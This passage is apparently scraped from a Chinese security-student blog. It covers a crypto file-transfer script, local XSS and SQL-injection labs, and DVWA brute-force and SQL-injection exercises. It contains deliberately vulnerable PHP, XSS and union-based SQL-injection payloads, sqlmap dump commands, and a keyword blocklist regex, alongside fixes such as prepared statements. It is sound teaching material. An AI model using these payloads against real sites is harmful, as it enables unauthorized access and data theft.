# 将密钥转换成二进制数 print(&quot;解密传输内容:&quot;) print(libnum.b2s(DES_decode(cipher, bin_key))) #打印出解密后的明文 message = &quot;Bob received the file successfully!&quot; con.send(bytes(message,&#x27;utf-8&#x27;)) con.recv(1024).decode() hash_message = md5(message) crypt_message = str(RSAEncode(hash_message,d,n)) con.send(bytes(crypt_message,&#x27;utf-8&#x27;)) break server.close() file_decode # -*- coding = utf - 8 -*- #@Time : 2021/1/3 23:17 #@Author : sunzy #@File : file_decode.py import random import socket import re from RSA import * from DES import * from MD5 import * def gen_key(): # 生成64位的对称加密的密钥 list = [] for i in range(64): c = random.choice([&#x27;0&#x27;, &#x27;1&#x27;]) list.append(c) res = &quot;&quot;.join(list) return res def read_file(): try: f = open(&#x27;text.txt&#x27;,&#x27;r&#x27;, encoding = &#x27;utf-8&#x27;) text = f.read() f.close() print(&quot;读取成功!&quot;) return text except IOError: print(&quot;读取错误!&quot;) def bin_to_str(bin_str) : # 8位二进制转字符，用于bob收到密后使用 res = &quot;&quot; tmp = re.findall(r&#x27;.&#123;8&#125;&#x27;,bin_str) for i in tmp : res += chr(int(i,2)) return res","tags":[{"name":"古典密码","slug":"古典密码","permalink":"https://sunzhengyu99.github.io/tags/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81/"},{"name":"DES","slug":"DES","permalink":"https://sunzhengyu99.github.io/tags/DES/"},{"name":"RSA","slug":"RSA","permalink":"https://sunzhengyu99.github.io/tags/RSA/"},{"name":"MD5","slug":"MD5","permalink":"https://sunzhengyu99.github.io/tags/MD5/"}]},{"title":"xss和sql注入简单环境的搭建","date":"2020-11-15T08:14:50.000Z","path":"2020/11/15/xss-sql/","text":"xss和sql注入简单环境的搭建以下环境都是基于PHP study搭建的，版本为 php 5.5.38+Apache 参考了dvwa的漏洞源码与攻击方式。 xss漏洞的搭建1.网页源码&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html;charset&#x3D;utf-8&quot;&gt; &lt;title&gt;xss&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;center&gt; &lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot;&gt; &lt;h6&gt;please input your name!&lt;&#x2F;h6&gt; &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot; value&#x3D;&quot;&quot; &#x2F;&gt;&lt;br &#x2F;&gt; &lt;input type&#x3D;&#39;submit&#39; value&#x3D;&quot;submit&quot; &#x2F;&gt; &lt;&#x2F;form&gt; &lt;?php function SafeFilter (&amp;$arr) &#123; $ra&#x3D;Array(&#39;&#x2F;([\\x00-\\x08,\\x0b-\\x0c,\\x0e-\\x19])&#x2F;&#39;,&#39;&#x2F;script&#x2F;&#39;,&#39;&#x2F;javascript&#x2F;&#39;,&#39;&#x2F;vbscript&#x2F;&#39;,&#39;&#x2F;expression&#x2F;&#39;,&#39;&#x2F;applet&#x2F;&#39; ,&#39;&#x2F;meta&#x2F;&#39;,&#39;&#x2F;xml&#x2F;&#39;,&#39;&#x2F;blink&#x2F;&#39;,&#39;&#x2F;link&#x2F;&#39;,&#39;&#x2F;style&#x2F;&#39;,&#39;&#x2F;embed&#x2F;&#39;,&#39;&#x2F;object&#x2F;&#39;,&#39;&#x2F;frame&#x2F;&#39;,&#39;&#x2F;layer&#x2F;&#39;,&#39;&#x2F;title&#x2F;&#39;,&#39;&#x2F;bgsound&#x2F;&#39; ,&#39;&#x2F;base&#x2F;&#39;,&#39;&#x2F;onload&#x2F;&#39;,&#39;&#x2F;onunload&#x2F;&#39;,&#39;&#x2F;onchange&#x2F;&#39;,&#39;&#x2F;onsubmit&#x2F;&#39;,&#39;&#x2F;onreset&#x2F;&#39;,&#39;&#x2F;onselect&#x2F;&#39;,&#39;&#x2F;onblur&#x2F;&#39;,&#39;&#x2F;onfocus&#x2F;&#39;, &#39;&#x2F;onabort&#x2F;&#39;,&#39;&#x2F;onkeydown&#x2F;&#39;,&#39;&#x2F;onkeypress&#x2F;&#39;,&#39;&#x2F;onkeyup&#x2F;&#39;,&#39;&#x2F;onclick&#x2F;&#39;,&#39;&#x2F;ondblclick&#x2F;&#39;,&#39;&#x2F;onmousedown&#x2F;&#39;,&#39;&#x2F;onmousemove&#x2F;&#39; ,&#39;&#x2F;onmouseout&#x2F;&#39;,&#39;&#x2F;onmouseover&#x2F;&#39;,&#39;&#x2F;onmouseup&#x2F;&#39;,&#39;&#x2F;onunload&#x2F;&#39;); if (is_array($arr)) &#123; foreach ($arr as $key &#x3D;&gt; $value) &#123; if (!is_array($value)) &#123; if (!get_magic_quotes_gpc()) &#x2F;&#x2F;不对magic_quotes_gpc转义过的字符使用addslashes(),避免双重转义。 &#123; $value &#x3D; addslashes($value); &#x2F;&#x2F;给单引号（&#39;）、双引号（&quot;）、反斜线（\\）与 NUL（NULL 字符） 加上反斜线转义 &#125; $value &#x3D; preg_replace($ra,&#39;&#39;,$value); &#x2F;&#x2F;删除非打印字符，粗暴式过滤xss可疑字符串 $arr[$key] &#x3D; htmlentities(strip_tags($value)); &#x2F;&#x2F;去除 HTML 和 PHP 标记并转换为 HTML 实体 &#125; else &#123; SafeFilter($arr[$key]); &#125; &#125; &#125; &#125; &#x2F;&#x2F;php防注入和XSS攻击通用过滤 $_POST &amp;&amp; SafeFilter($_POST); if (isset($_POST[&#39;username&#39;])) &#123; $s&#x3D;$_POST[&#39;username&#39;]; echo $s; &#125; ?&gt; &lt;&#x2F;center&gt; &lt;&#x2F;script&gt; &lt;&#x2F;body&gt; &lt;&#x2F;html&gt; 网页源码十分简单，就是用户输入所要查询的username，之后将其输入的内容打印出来。 起初并没有对用户的输入进行处理，直接执行了echo，造成了xss漏洞的出现。 2.攻击效果在输入栏中输入以下 &lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt; &lt;img src=1 onerror=alert(/xsss/)&gt; 3.漏洞修复修复漏洞只需要对用户的输入内容进行检测和过滤，并将一些可能造成攻击的特殊字符进行转义，让其不起到原本的作用。 过滤函数如下 function SafeFilter (&amp;$arr) &#123; $ra=Array(&#x27;/([\\x00-\\x08,\\x0b-\\x0c,\\x0e-\\x19])/&#x27;,&#x27;/script/&#x27;,&#x27;/javascript/&#x27;,&#x27;/vbscript/&#x27;,&#x27;/expression/&#x27;,&#x27;/applet/&#x27; ,&#x27;/meta/&#x27;,&#x27;/xml/&#x27;,&#x27;/blink/&#x27;,&#x27;/link/&#x27;,&#x27;/style/&#x27;,&#x27;/embed/&#x27;,&#x27;/object/&#x27;,&#x27;/frame/&#x27;,&#x27;/layer/&#x27;,&#x27;/title/&#x27;,&#x27;/bgsound/&#x27; ,&#x27;/base/&#x27;,&#x27;/onload/&#x27;,&#x27;/onunload/&#x27;,&#x27;/onchange/&#x27;,&#x27;/onsubmit/&#x27;,&#x27;/onreset/&#x27;,&#x27;/onselect/&#x27;,&#x27;/onblur/&#x27;,&#x27;/onfocus/&#x27;, &#x27;/onabort/&#x27;,&#x27;/onkeydown/&#x27;,&#x27;/onkeypress/&#x27;,&#x27;/onkeyup/&#x27;,&#x27;/onclick/&#x27;,&#x27;/ondblclick/&#x27;,&#x27;/onmousedown/&#x27;,&#x27;/onmousemove/&#x27; ,&#x27;/onmouseout/&#x27;,&#x27;/onmouseover/&#x27;,&#x27;/onmouseup/&#x27;,&#x27;/onunload/&#x27;); if (is_array($arr)) &#123; foreach ($arr as $key =&gt; $value) //循环语句，挨个检测 &#123; if (!is_array($value)) &#123; if (!get_magic_quotes_gpc()) &#123; $value = addslashes($value); //给单引号（&#x27;）、双引号（&quot;）、反斜线（\\）与 NUL（NULL 字符） 加上反斜线转义 &#125; $value = preg_replace($ra,&#x27;&#x27;,$value); //删除非打印字符 $arr[$key] = htmlentities(strip_tags($value)); //去除 HTML 和 PHP 标记并转换为 HTML 实体 &#125; else &#123; SafeFilter($arr[$key]); &#125; &#125; &#125; &#125; 各个函数功能如下： magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误 在magic_quotes_gpc=On的情况下，如果输入的数据有 单引号（’）、双引号（”）、反斜线（）与 NUL（NULL 字符）等字符都会被加上反斜线。 addslashes函数 htmlentities() 函数把字符转换为 HTML 实体。 sql注入环境搭建与攻击网页源码，最常见的登录页面，其中没有对用户名和密码进行过滤，就将其带入sql语句中查询造成了sql注入的出现。 login.php源码 &lt;!DOCTYPE html&gt; &lt;html &gt;&lt;head&gt;&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot;&gt; &lt;title&gt;Sqli&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;body&gt; &lt;div class&#x3D;&quot;limiter&quot;&gt; &lt;div class&#x3D;&quot;container-login100&quot;&gt; &lt;div class&#x3D;&quot;wrap-login100 p-b-160 p-t-50&quot;&gt; &lt;form class&#x3D;&quot;login100-form validate-form&quot; action&#x3D;&quot;check.php&quot; method&#x3D;&quot;post&quot;&gt; &lt;span class&#x3D;&quot;login100-form-title p-b-43&quot;&gt; Account Login &lt;&#x2F;span&gt; &lt;div class&#x3D;&quot;wrap-input100 rs1 validate-input&quot; data-validate&#x3D;&quot;Username is required&quot;&gt; &lt;input class&#x3D;&quot;input100&quot; type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot;&gt; &lt;span class&#x3D;&quot;label-input100&quot;&gt;Username&lt;&#x2F;span&gt; &lt;&#x2F;div&gt; &lt;div class&#x3D;&quot;wrap-input100 rs2 validate-input&quot; data-validate&#x3D;&quot;Password is required&quot;&gt; &lt;input class&#x3D;&quot;input100&quot; type&#x3D;&quot;password&quot; name&#x3D;&quot;password&quot;&gt; &lt;span class&#x3D;&quot;label-input100&quot;&gt;Password&lt;&#x2F;span&gt; &lt;&#x2F;div&gt; &lt;div class&#x3D;&quot;container-login100-form-btn&quot;&gt; &lt;button type&#x3D;&quot;submit&quot; class&#x3D;&quot;login100-form-btn&quot;&gt; Sign in &lt;&#x2F;button&gt; &lt;&#x2F;div&gt; &lt;&#x2F;form&gt; &lt;&#x2F;div&gt; &lt;&#x2F;a&gt; &lt;&#x2F;div&gt; &lt;&#x2F;body&gt; &lt;&#x2F;html&gt; check.php源码 &lt;?php $pwd=$_POST[&#x27;password&#x27;]; $uname=$_POST[&#x27;username&#x27;]; $mysqli = new mysqli(&#x27;localhost&#x27;,&#x27;root&#x27;,&#x27;root&#x27;,&#x27;test&#x27;); // 数据库服务器的主机名这里使用的本地主机，密码，使用的数据库名 if(mysqli_connect_errno())&#123; printf(&quot;fail:%s&lt;br&gt;&quot;,mysqli_connect_error()); exit(); &#125; $result = $mysqli-&gt;query(&quot;select * from users where username=&#x27;$uname&#x27; and password=&#x27;$pwd&#x27;&quot;); echo &quot;&lt;TABLE border=1,width=400&gt;&quot;; echo &quot;&lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Password&lt;/th&gt;&lt;tr&gt;&quot;; if($row=mysqli_fetch_row($result)) &#123; printf (&quot;&lt;tr&gt;&lt;td&gt;%s&lt;/td&gt;&lt;td&gt;%s&lt;/td&gt;&lt;/tr&gt;&quot;,$row[1],$row[2]); echo &quot;&lt;br&gt;&quot;; echo &quot;login success&quot;; &#125; else &#123; echo &quot;username or password error&quot;; &#125; // echo &quot;&lt;/TABLE&gt;&quot;; // echo &quot;&lt;/div&gt;&quot;; $mysqli-&gt;close(); $result-&gt;close(); ?&gt; 逻辑很简单，在login.php页面提交用户名和密码，将username和password发送到check.php页面连接数据库检查用户是否合法，用户名和密码都正确则，打印出用户名和密码。 在数据库建立了一张users和flag表，便于注入。 表中的内容如下 1.漏洞利用直接使用万能密码登陆 username:1&#x27; or 1=1 # username:111 结果打印出了第一个用户的用户名和密码 这个结果也说名了是字符型注入，接下来利用改注入点获取flag 判断表有几列1&#x27; order by 3# 页面显示正常，而改为4的时候网页出现报错，说明了只有三列 1&#x27; order by 4# 判断显示位&#x27; union select 1,database(),3# 说明有两个显示位，选择其中一个位置进行注入即可。 获取表名&#x27; union select 1,group_concat(table_name),3 from information_schema.TABLES where TABLE_SCHEMA=database()# 获取列名&#x27; union select 1,group_concat(COLUMN_name),3 from information_schema.COLUMNS where TABLE_NAME=&#x27;flag&#x27;# （fl4g是dvwa实验中建立没有删除，所以也显示出来了） 获取flag&#x27; union select 1,group_concat(flag),3 from flag# 2.漏洞防御方法一：最简单的方法对用户名和密码的长度限制，一般用户名的长度不超过十五个字符，而密码的长度一般不超过16个字符长度，所以对用户输入限制长度是最有效的方法之一。因为一般的注入语句都是超过十六个字符的，想要在十六个字符之内构造出有效的注入语句是一件很难的事情。 代码实现 &lt;?php $pwd=$_POST[&#x27;password&#x27;]; $uname=$_POST[&#x27;username&#x27;]; $mysqli = new mysqli(&#x27;localhost&#x27;,&#x27;root&#x27;,&#x27;root&#x27;,&#x27;test&#x27;); // 数据库服务器的主机名这里使用的本地主机，密码，使用的数据库名 if(mysqli_connect_errno())&#123; printf(&quot;fail:%s&lt;br&gt;&quot;,mysqli_connect_error()); exit(); &#125; $result = $mysqli-&gt;query(&quot;select * from users where username=&#x27;$uname&#x27; and password=&#x27;$pwd&#x27;&quot;); echo &quot;&lt;TABLE border=1,width=400&gt;&quot;; echo &quot;&lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Password&lt;/th&gt;&lt;tr&gt;&quot;; if(strlen($pwd)&gt;=16||strlen($uname)&gt;=15) &#123; echo &quot;It is too long.&quot;; &#125; else if($row=mysqli_fetch_row($result)) &#123; printf (&quot;&lt;tr&gt;&lt;td&gt;%s&lt;/td&gt;&lt;td&gt;%s&lt;/td&gt;&lt;/tr&gt;&quot;,$row[1],$row[2]); echo &quot;&lt;br&gt;&quot;; echo &quot;login success.&quot;; &#125; else &#123; echo &quot;username or password error.&quot;; &#125; // echo &quot;&lt;/TABLE&gt;&quot;; // echo &quot;&lt;/div&gt;&quot;; $mysqli-&gt;close(); $result-&gt;close(); ?&gt; 方法二对用户输入进行检测和过滤，将其输入的可能产生恶意行为的代码删除或者转义，使其失去原来的功能。 代码实现 &lt;?php $pwd=$_POST[&#x27;password&#x27;]; $uname=$_POST[&#x27;username&#x27;]; //echo &quot;select * from admin where passward=&#x27;$pwd&#x27; and name=&#x27;$uname&#x27;&lt;br/&gt;&quot;; //echo &quot;&lt;hr&gt;&quot;; function inject_check($Sql_Str) &#123;//自动过滤Sql的注入语句。 $check=preg_match(&#x27;/select|from|where|if|database|order|insert|update|or|group_concat|\\&#x27;|\\\\*|\\*|\\.\\.\\/|\\.\\/|union|and|ascii|substring|sleep/i&#x27;,$Sql_Str); if ($check) &#123; echo &#x27;&lt;script language=&quot;JavaScript&quot;&gt;alert(&quot;hacker&quot;);&lt;/script&gt;&#x27;; exit(); &#125;else&#123; return $Sql_Str; &#125; &#125; $pwd=inject_check($pwd); $uname = inject_check($uname); $mysqli = new mysqli(&#x27;localhost&#x27;,&#x27;root&#x27;,&#x27;root&#x27;,&#x27;test&#x27;); // 数据库服务器的主机名这里使用的本地主机，密码，使用的数据库名 if(mysqli_connect_errno())&#123; printf(&quot;fail:%s&lt;br&gt;&quot;,mysqli_connect_error()); exit(); &#125; $result = $mysqli-&gt;query(&quot;select * from users where username=&#x27;$uname&#x27; and password=&#x27;$pwd&#x27;&quot;); echo &quot;&lt;TABLE border=1,width=400&gt;&quot;; echo &quot;&lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Password&lt;/th&gt;&lt;tr&gt;&quot;; // if(strlen($pwd)&gt;=16||strlen($uname)&gt;=15) // &#123; // echo &quot;It is too long.&quot;; // &#125; // else if($row=mysqli_fetch_row($result)) &#123; printf (&quot;&lt;tr&gt;&lt;td&gt;%s&lt;/td&gt;&lt;td&gt;%s&lt;/td&gt;&lt;/tr&gt;&quot;,$row[1],$row[2]); echo &quot;&lt;br&gt;&quot;; echo &quot;login success.&quot;; &#125; else &#123; echo &quot;username or password error.&quot;; &#125; // echo &quot;&lt;/TABLE&gt;&quot;; // echo &quot;&lt;/div&gt;&quot;; $mysqli-&gt;close(); $result-&gt;close(); ?&gt; 过滤函数如下，其中将一般注入需要用到的函数和符号都过滤了。 function inject_check($Sql_Str) &#123;//自动过滤Sql的注入语句。 $check=preg_match(&#x27;/select|from|where|if|database|order|insert|update|or|group_concat|\\&#x27;|\\\\*|\\*|\\.\\.\\/|\\.\\/|union|and|ascii|substring|sleep/i&#x27;,$Sql_Str); if ($check) &#123; echo &#x27;&lt;script language=&quot;JavaScript&quot;&gt;alert(&quot;hacker&quot;);&lt;/script&gt;&#x27;; exit(); &#125;else&#123; return $Sql_Str; &#125; &#125; 方法三使用预编译语句 代码如下 &lt;?php $pwd=$_POST[&#x27;password&#x27;]; $uname=$_POST[&#x27;username&#x27;]; // function inject_check($Sql_Str) &#123;//自动过滤Sql的注入语句。 // $check=preg_match(&#x27;/select|from|where|if|database|order|insert|update|or|group_concat|\\&#x27;|\\\\*|\\*|\\.\\.\\/|\\.\\/|union|and|ascii|substring|sleep/i&#x27;,$Sql_Str); // if ($check) &#123; // echo &#x27;&lt;script language=&quot;JavaScript&quot;&gt;alert(&quot;hacker&quot;);&lt;/script&gt;&#x27;; // exit(); // &#125;else&#123; // return $Sql_Str; // &#125; // &#125; // $pwd=inject_check($pwd); // $uname = inject_check($uname); // $mysqli = new mysqli(&#x27;localhost&#x27;,&#x27;root&#x27;,&#x27;root&#x27;,&#x27;test&#x27;); // 数据库服务器的主机名这里使用的本地主机，密码，使用的数据库名 if(mysqli_connect_errno())&#123; printf(&quot;fail:%s&lt;br&gt;&quot;,mysqli_connect_error()); exit(); &#125; echo &quot;&lt;TABLE border=1,width=400&gt;&quot;; echo &quot;&lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Password&lt;/th&gt;&lt;tr&gt;&quot;; $result = $mysqli-&gt;prepare(&quot;select * from users where username=? and password=?&quot;); $result-&gt;bind_param(&#x27;ss&#x27;,$uname,$pwd); $result-&gt;execute(); $result-&gt;store_result(); $result-&gt;bind_result($id,$un,$pd); //将查询到的变量绑定到三个自定义的变量中，输出时直接输出这三个变量即可。 if($result-&gt;fetch()) &#123; printf(&quot;&lt;tr&gt;&lt;td&gt;%s&lt;/td&gt;&lt;td&gt;%s&lt;/td&gt;&lt;/tr&gt;&quot;,$un,$pd); &#125; else &#123; echo &quot;username or password error.&quot;; &#125; // if(strlen($pwd)&gt;=16||strlen($uname)&gt;=15) // &#123; // echo &quot;It is too long.&quot;; // &#125; echo &quot;&lt;/TABLE&gt;&quot;; echo &quot;&lt;/div&gt;&quot;; $result-&gt;close(); $mysqli-&gt;close(); ?&gt; 应用预编译语句后，再次输入注入语句后就不再起到注入作用，只是将其当成正常的查询过程，返回相应的结果。","tags":[{"name":"sql","slug":"sql","permalink":"https://sunzhengyu99.github.io/tags/sql/"},{"name":"xss","slug":"xss","permalink":"https://sunzhengyu99.github.io/tags/xss/"}]},{"title":"网安作业2","date":"2020-11-12T11:09:43.000Z","path":"2020/11/12/网安作业2/","text":"DVWA实验一下都是基于low,mid,high级别的实验，为了方便叙述，提前在数据库中建了一个flag表 Brute Force使用工具 ：bp 使用材料：密码字典 bp的四种爆破攻击类型第一种：Sniper标签 这个是我们最常用的，Sniper是狙击手的意思。这个模式会使用单一的payload【就是导入字典的payload】组。它会针对每个position中$$位置设置payload。这种攻击类型适合对常见漏洞中的请求参数单独地进行测试。攻击中的请求总数应该是position数量和payload数量的乘积。 第二种：Battering ram – 这一模式是使用单一的payload组。它会重复payload并且一次把所有相同的payload放入指定的位置中。这种攻击适合那种需要在请求中把相同的输入放到多个位置的情况。请求的总数是payload组中payload的总数。简单说就是一个playload字典同时应用到多个position中 第三种：Pitchfork – 这一模式是使用多个payload组。对于定义的位置可以使用不同的payload组。攻击会同步迭代所有的payload组，把payload放入每个定义的位置中。比如：position中A处有a字典，B处有b字典，则a【1】将会对应b【1】进行attack处理，这种攻击类型非常适合那种不同位置中需要插入不同但相关的输入的情况。请求的数量应该是最小的payload组中的payload数量 第四种：Cluster bomb – 这种模式会使用多个payload组。每个定义的位置中有不同的payload组。攻击会迭代每个payload组，每种payload组合都会被测试一遍。比如：position中A处有a字典，B处有b字典，则两个字典将会循环搭配组合进行attack处理这种攻击适用于那种位置中需要不同且不相关或者未知的输入的攻击。攻击请求的总数是各payload组中payload数量的乘积。 low1.抓包–&gt;ctrl+I –&gt;标记要爆破的参数，这里直接爆破password 2.选择要加载的密码字典，可以使用自己准备的密码字典，也可以使用bp自带的密码字典，但是最重要的是要包含正确达到密码 3.开始爆破 ，根据响应包的长度筛选出正确密码的响应包，这里只有当密码为password的时候响应包的长度为4743,所以password就是争取密码。 medium&lt;?php if( isset( $_GET[ &#x27;Login&#x27; ] ) ) &#123; // Sanitise username input $user = $_GET[ &#x27;username&#x27; ]; $user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Sanitise password input $pass = $_GET[ &#x27;password&#x27; ]; $pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass = md5( $pass ); // Check the database $query = &quot;SELECT * FROM `users` WHERE user = &#x27;$user&#x27; AND password = &#x27;$pass&#x27;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123; // Get users details $row = mysqli_fetch_assoc( $result ); $avatar = $row[&quot;avatar&quot;]; // Login successful echo &quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;; echo &quot;&lt;img src=\\&quot;&#123;$avatar&#125;\\&quot; /&gt;&quot;; &#125; else &#123; // Login failed sleep( 2 ); echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); &#125; ?&gt; 与low级别相比较，只是增加了回显的时间，所以还是可以使用low级别的方法直接爆破，不过花费的时间相对会长一点。 1.火狐浏览器打开代理抓包后发到爆破模块，添加爆破的变量。 2.加载密码字典进行爆破。 3.根据响应包的长度确定正确密码。 high&lt;?php if( isset( $_GET[ &#x27;Login&#x27; ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; ); // Sanitise username input $user = $_GET[ &#x27;username&#x27; ]; $user = stripslashes( $user ); $user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Sanitise password input $pass = $_GET[ &#x27;password&#x27; ]; $pass = stripslashes( $pass ); $pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass = md5( $pass ); // Check database $query = &quot;SELECT * FROM `users` WHERE user = &#x27;$user&#x27; AND password = &#x27;$pass&#x27;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123; // Get users details $row = mysqli_fetch_assoc( $result ); $avatar = $row[&quot;avatar&quot;]; // Login successful echo &quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;; echo &quot;&lt;img src=\\&quot;&#123;$avatar&#125;\\&quot; /&gt;&quot;; &#125; else &#123; // Login failed sleep( rand( 0, 3 ) ); echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); &#125; // Generate Anti-CSRF token generateSessionToken(); ?&gt; 审计代码后可以发现使用了随机token机制来防止CSRF，从而在一定程度上防止了重放攻击，增加了爆破难度，但是任然可以使用bp的爆破模块 1.抓包，发包到爆破模块并添加参数，这次需要添加两个参数，设置 password和user_token为变量 2.攻击类型选择pitchfork，意思是草叉模式（Pitchfork ）——它可以使用多组Payload集合，在每一个不同的Payload标志位置上（最多20个），遍历所有的Payload。举例来说，如果有两个Payload标志位置，第一个Payload值为A和B，第二个Payload值为C和D，则发起攻击时，将共发起两次攻击，第一次使用的Payload分别为A和C，第二次使用的Payload分别为B和D。 3.设置参数，在option选项卡中将攻击线程thread设置为1，因为Recursive_Grep模式不支持多线程攻击，然后选择Grep-Extract，意思是用于提取响应消息中的有用信息，点击Add，如下图进行设置，最后将Redirections设置为Always 4.设置payload，第一个参数是密码与之前两次一样，加载密码字典即可，第二token参数选择Recursive grep，然后将options中的token作为第一次请求的初始值。 5.start attack,还是根据响应包长度的不同找到包含真正密码的请求包，获取正确密码。 SQL Injectionlow&lt;?php if( isset( $_SESSION [ &#x27;id&#x27; ] ) ) &#123; // Get input $id = $_SESSION[ &#x27;id&#x27; ]; // Check database $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27; LIMIT 1;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#x27; ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) &#123; // Get values $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // Feedback for end user echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); &#125; ?&gt; SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39; LIMIT 1;注入点就在这句代码中 手工注入1.判断注入类型1 or 1=1 # 1&#x27; or 1=1 # 可知是字符型注入 2.判断多少字段数1&#x27; order by 1,2,3 # 报错 1&#x27; order by 1,2 # 显示正常，说明只有2个字段 3.确认显示顺序 两个位置都可以使用 4.union查询1&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()# 1&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27; # 1&#x27; union select 1,group_concat(fl4g) from flag # sqlmap注入python2 sqlmap.py -u &quot;http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=0477644f8a563ab1fd2f2ecba45bd2d1&quot; --batch --dbs python2 sqlmap.py -u &quot;http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=0477644f8a563ab1fd2f2ecba45bd2d1&quot; --batch -D dvwa -T flag --columns python2 sqlmap.py -u &quot;http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=0477644f8a563ab1fd2f2ecba45bd2d1&quot; --batch -D dvwa -T flag -C fl4g --dump medium与low级别相比较，这里的id值不需要用户输入，只需要选择，但是可以抓包修改id的内容 手工注入经过测试是数字型注入，很简单的判断就不截图了 1.判断列数id=1 order by 1,2#&amp;Submit=Submit 此时页面正常 id=1 order by 1,2,3#&amp;Submit=Submit 此时页面报错 Unknown column &#39;3&#39; in &#39;order clause&#39; 所以可知为两列，之后的操作与low级别的一样 2.union查询爆数据库名 id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#&amp;Submit=Submit 爆列名 id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x666c6167 #&amp;Submit=Submit 读取flag id=-1 union select 1,group_concat(fl4g) from flag #&amp;Submit=Submit 